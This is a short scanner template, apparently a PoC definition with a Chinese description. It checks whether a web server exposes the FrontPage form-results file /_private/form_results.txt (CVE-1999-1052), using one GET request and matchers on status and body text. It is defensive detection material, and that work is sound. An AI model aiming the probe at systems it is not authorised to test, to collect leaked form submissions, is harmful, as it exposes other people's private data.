[info]
author = "AVE"
description = "检测目标站点是否存在 FrontPage 默认表单结果文件 /_private/form_results.txt，该文件世界可读，可泄露用户提交的敏感信息"
id = "POC-AVE-1999-0905"
name = "Microsoft FrontPage 表单结果信息泄露 PoC"
severity = "medium"
tags = ["cve-1999-1052"]
vuln_id = [
    "CVE-1999-1052",
    "AVE-1999-0905",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_private/form_results.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["form_results"]
